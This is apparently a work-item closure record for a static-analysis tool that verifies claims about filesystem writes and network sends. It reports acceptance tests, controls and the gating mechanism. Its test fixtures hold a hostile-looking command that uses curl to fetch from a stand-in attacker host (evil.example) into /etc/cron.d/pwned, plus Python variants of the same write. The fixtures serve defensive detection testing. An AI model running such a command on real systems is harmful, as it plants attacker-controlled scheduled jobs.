  clock: 3  # 0b53
  nonce: 0b53  # 0b53
  message: "SATISFIED in PR merged at dev d7b069b106. Behavioural evidence re-run on the\nMERGED tree, not on the branch, with both controls firing in the same session.\n\nTHE ACCEPTANCE TEST (the positive control this item was filed with). Fixture\nfx2/deploy.sh, two lines, only external command is\ncurl -o /etc/cron.d/pwned \"https://evil.example/payload\". The six-line\ncurl -> net_send catalogue re-added to io_primitives/ and removed afterwards\n(tree verified clean):\n\n  hypergumbo verify-claims fx2 --claims claims-fswrite.yaml\n    -> rc 2, Verdict: inconclusive\n    -> \"No fs_write chains found, but the analysis launches an external program\n        at 1 call site(s) (curl.curl) and cannot see what the launched program\n        does, so whether this I/O happens there was never examined\"\n  hypergumbo verify-claims fx2 --claims claims-netsend.yaml\n    -> rc 1, Verdict: violated (\"1 net_send chain(s) found\")\n\nPre-fix, the identical catalogue and fixture returned CONFIRMED rc 0 for the\nfs_write claim. So the defect is closed in the direction filed, and the\ndetection the row buys is preserved rather than traded away — the whole point\nof gating on opacity rather than on classification.\n\nNON-DESTRUCTION, asserted because \"no change\" is the correct outcome today and\na null is not evidence on its own: with no bash.yaml present (the shipped\nstate), both claims return inconclusive rc 2, exactly as before the change.\nNothing reaches the new branch while bash has no catalogue — the corpus delta\nis zero BY CONSTRUCTION, and the acceptance test above is what shows the branch\nis nonetheless armed rather than inert.\n\nCONTROLS, same session, same merged tree:\n  fxpy   subprocess.run([\"curl\",\"-o\",\"/etc/cron.d/pwned\",URL])  -> rc 2 inconclusive\n         (INV-gahuz's catalogue-declared arm still holds — not regressed)\n  fxctl  open(\"/etc/cron.d/pwned\",\"w\").write(data)              -> rc 1 violated\n         (a real fs_write is still detected — the gate did not simply start\n          blocking everything, which is the failure mode a lone inconclusive\n          cannot distinguish itself from)\n\nMECHANISM. PRODUCER_OPAQUE_BOUNDARIES (io_boundary.py) carries the\nanalyzer-stamped command_launch beside the catalogue-declared subprocess in\nOPAQUE_BOUNDARIES. _opaque_launch_sites consults the producer stamp BEFORE\nclassify_call, inside the shared _external_call_sites iteration (INV-motos —\nsharing a predicate is not enough, the population has to be shared too). The\ntwo sets are disjoint by construction and each is asserted reachable through\nits own channel: a catalogue-declarable opaque boundary is inert unless it is\nin CATALOG_BOUNDARY_TYPES (the pre-existing assertion, which passed\nUNMODIFIED), and a producer-stamped one is inert if it IS (the new mirror).\n\nPARITY ACROSS THE PACKAGE SEAM. test_bash.py asserts the bash analyzer's stamp\nis a member of PRODUCER_OPAQUE_BOUNDARIES, against the SET rather than the\nliteral string, so renaming the boundary at either end fails a test instead of\nsilently unhooking the gate. That seam crosses hypergumbo-core /\nhypergumbo-lang-mainstream and both packages pass at 100% in isolation.\n\nWHAT THIS DOES NOT DO, stated rather than implied:\n\n  - It does NOT reopen ADR-0016's ruling against a bash data-I/O catalogue.\n    The ruling stands; this removes the false confirm that would follow if\n    anyone decided otherwise, which is the honest-gate-first ordering applied\n    for the third time (INV-dabov, INV-gahuz, now this).\n  - Cataloguing a command still DISPLACES the producer stamp rather than\n    supplementing it (command_launch_edges 1 -> 0, total_io_edges 0 -> 1),\n    collapsing the count-vs-disclose split WI-javoh built. That is a COUNTING\n    concern, not a verdict one, and it is untouched here. Recorded in this\n    item's description and in the ADR amendment.\n  - WI-guhuv (filed alongside, P2) remains open: an io_primitives overlay is\n    silently inert for a language with no shipped catalogue, so a user cannot\n    supply these rows themselves either. It has a hard prerequisite on THIS\n    item, which is now met.\n\nPROVENANCE. Found by checking a queued item's premise, not by working the item.\nThe queue said \"write io_primitives/bash.yaml\"; ADR-0016:96 said the opposite;\nmeasuring settled it and turned up a hazard neither had named. That is the\nfifth consecutive P1-or-worse from a control rather than from the filed work.\n\nSuite at merge: 22,511 passed / 100% coverage / 6 packages isolated / mypy\nstrict ratchet clean."  # 0b53
